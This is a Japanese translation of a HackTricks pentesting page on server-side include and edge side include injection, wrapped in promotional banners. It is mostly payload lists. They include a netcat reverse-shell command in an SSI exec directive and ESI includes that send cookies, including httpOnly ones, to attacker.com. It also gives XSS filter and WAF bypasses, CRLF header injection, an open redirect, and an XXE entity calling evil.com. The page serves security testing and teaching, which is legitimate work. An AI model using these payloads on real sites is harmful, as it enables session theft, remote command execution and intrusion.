# サーバーサイドインクルージョン/エッジサイドインクルージョンインジェクション

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)や[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有する。

</details>

## サーバーサイドインクルージョン基本情報

SSI（サーバーサイドインクルード）は、HTMLページに**配置され、ページが提供される間にサーバー上で評価される**ディレクティブです。これにより、CGIプログラムやその他の動的技術を使用せずに、既存のHTMLページに**動的に生成されたコンテンツを追加**することができます。\
例えば、既存のHTMLページに次のようなディレクティブを配置することができます：

`<!--#echo var="DATE_LOCAL" -->`

そして、ページが提供されると、このフラグメントは評価され、その値で置き換えられます：

`Tuesday, 15-Jan-2013 19:28:54 EST`

SSIを使用するか、ページを完全にプログラムで生成するかの決定は、通常、ページのどれだけが静的で、どれだけがページが提供されるたびに再計算する必要があるかによります。SSIは、上記の現在時刻などの小さな情報を追加するのに適しています。しかし、ページの大部分が提供される時に生成される場合は、他の解決策を探す必要があります。（定義は[こちら](https://httpd.apache.org/docs/current/howto/ssi.html)から取得しました）。

ウェブアプリケーションが拡張子が\*\* `.shtml`, `.shtm` または `.stm`\*\*のファイルを使用している場合、SSIの存在を推測することができますが、それだけではありません。

典型的なSSI表現は次の形式を持っています：
```
<!--#directive param="value" -->
```
### チェック
```javascript
// Document name
<!--#echo var="DOCUMENT_NAME" -->
// Date
<!--#echo var="DATE_LOCAL" -->

// File inclusion
<!--#include virtual="/index.html" -->
// Including files (same directory)
<!--#include file="file_to_include.html" -->
// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->
// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->
// Modification date of a file
<!--#flastmod file="index.html" -->

// Command exec
<!--#exec cmd="dir" -->
// Command exec
<!--#exec cmd="ls" -->
// Reverse shell
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->

// Print all variables
<!--#printenv -->
// Setting variables
<!--#set var="name" value="Rich" -->

```
## Edge Side Inclusion（エッジサイドインクルージョン）

キャッシュ情報や動的アプリケーションに問題があります。コンテンツの一部が次にコンテンツを取得する際に**変化**している可能性があります。これが**ESI**が使用される理由です。ESIタグを使用して、キャッシュバージョンを送信する前に**生成する必要がある動的コンテンツ**を示します。
もし**攻撃者**がキャッシュコンテンツ内にESIタグを**注入**することができれば、そのドキュメントがユーザーに送信される前に**任意のコンテンツを注入**することができるかもしれません。

### ESI 検出

サーバーからのレスポンスに以下の**ヘッダー**が含まれている場合、サーバーはESIを使用しています：
```
Surrogate-Control: content="ESI/1.0"
```
ヘッダーが見つからない場合でも、サーバーは**それでも ESI を使用している可能性があります**。\
リクエストが攻撃者のサーバーに到達するはずなので、**ブラインドエクスプロイトアプローチも使用できます**：
```javascript
// Basic detection
hell<!--esi-->o
// If previous is reflected as "hello", it's vulnerable

// Blind detection
<esi:include src=http://attacker.com>

// XSS Exploitation Example
<esi:include src=http://attacker.com/XSSPAYLOAD.html>

// Cookie Stealer (bypass httpOnly flag)
<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```
### ESI 悪用

[GoSecure](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/) は、サポートされている機能に応じて、異なる ESI 対応ソフトウェアに対して試すことができる潜在的な攻撃を理解するのに役立つ表を作成しました。まず、以下の表の列名についていくつかの説明を提供しましょう：

* **Includes**: `<esi:includes>` ディレクティブをサポートしています
* **Vars**: `<esi:vars>` ディレクティブをサポートしています。XSS フィルターをバイパスするのに役立ちます
* **Cookie**: ドキュメントのクッキーが ESI エンジンにアクセス可能です
* **Upstream Headers Required**: 上流アプリケーションがヘッダーを提供しない限り、サロゲートアプリケーションは ESI ステートメントを処理しません
* **Host Allowlist**: この場合、ESI のインクルードは許可されたサーバーホストからのみ可能であり、例えば、SSRF はそれらのホストに対してのみ可能です

|         **ソフトウェア**         | **Includes** | **Vars** | **Cookies** | **Upstream Headers Required** | **Host Allowlist** |
| :--------------------------: | :----------: | :------: | :---------: | :---------------------------: | :----------------: |
|            Squid3            |      はい     |    はい   |     はい     |              はい              |         いいえ         |
|         Varnish Cache        |      はい     |    いいえ    |      いいえ     |              はい              |         はい        |
|            Fastly            |      はい     |    いいえ    |      いいえ     |               いいえ              |         はい        |
| Akamai ESI Test Server (ETS) |      はい     |    はい   |     はい     |               いいえ              |         いいえ         |
|          NodeJS esi          |      はい     |    はい   |     はい     |               いいえ              |         いいえ         |
|         NodeJS nodesi        |      はい     |    いいえ    |      いいえ     |               いいえ              |      任意      |

#### XSS

以下の ESI ディレクティブは、サーバーのレスポンス内に任意のファイルをロードします
```markup
<esi:include src=http://attacker.com/xss.html>
```
ファイル _http://attacker.com/xss.html_ には `<script>alert(1)</script>` のようなXSSペイロードが含まれている可能性があります。

#### クライアントXSS保護をバイパスする
```markup
x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>

Use <!--esi--> to bypass WAFs:
<scr<!--esi-->ipt>aler<!--esi-->t(1)</sc<!--esi-->ript>
<img+src=x+on<!--esi-->error=ale<!--esi-->rt(1)>
```
#### クッキーの盗み

* リモートでクッキーを盗む
```markup
<esi:include src=http://attacker.com/$(HTTP_COOKIE)>
<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />
```
* XSSを利用してHTTP\_ONLYクッキーを反映させ、盗む方法：
```bash
# This will reflect the cookies in the response
<!--esi $(HTTP_COOKIE) -->
# Reflect XSS
<!--esi/$url_decode('"><svg/onload=prompt(1)>')/-->
```
#### プライベートローカルファイル

これを「ローカルファイルインクルージョン」と混同しないでください：
```markup
<esi:include src="secret.txt">
```
#### CRLF
```markup
<esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
```
#### オープンリダイレクト

以下はレスポンスに `Location` ヘッダーを追加します
```bash
<!--esi $add_header('Location','http://attacker.com') -->
```
#### ヘッダーを追加

* 強制リクエストにヘッダーを追加
```html
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345"/>
</esi:include>
```
* レスポンスにヘッダーを追加する（XSSを含むレスポンスで "Content-Type: text/json" をバイパスするのに役立つ）
```bash
<!--esi/$add_header('Content-Type','text/html')/-->

<!--esi/$(HTTP_COOKIE)/$add_header('Content-Type','text/html')/$url_decode($url_decode('"><svg/onload=prompt(1)>'))/-->
```
#### AddヘッダーにおけるCRLF (**CVE-2019-2438)**
```markup
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345
Host: anotherhost.com"/>
</esi:include>
```
#### Akamai デバッグ

これにより、レスポンスに含まれるデバッグ情報が送信されます:
```markup
<esi:debug/>
```
### ESI + XSLT = XXE

\*\* **\_**eXtensible Stylesheet Language Transformations (XSLT)**\_** \*\* を使用したESIインクルードを追加することも可能です。これは、_dca_ パラメータに `xslt` 値を指定することで実現します。以下のインクルードは、HTTPサロゲートにXMLとXSLTファイルのリクエストを行わせます。その後、XSLTファイルがXMLファイルをフィルタリングするために使用されます。このXMLファイルは、_XML External Entity (XXE)_ 攻撃を実行するために使用することができます。これにより攻撃者はSSRF攻撃を実行することができますが、これはESIインクルードを介して行わなければならないため、あまり有用ではありません。これはSSRFベクトル自体です。外部DTDは解析されません。なぜなら、基盤となるライブラリ(Xalan)はそれをサポートしていないからです。これは、ローカルファイルを抽出することはできないことを意味します。
```markup
<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />
```
XSLTファイル：
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file" >]>
<foo>&xxe;</foo>
```
XSLTページを確認してください:

{% content-ref url="xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

### 参考文献

* [https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
* [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
* [https://academy.hackthebox.com/module/145/section/1304](https://academy.hackthebox.com/module/145/section/1304)
* [https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91](https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91)

## ブルートフォース検出リスト

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で<strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>!</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックしてください。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加するか**、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローしてください。**
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有してください。

</details>
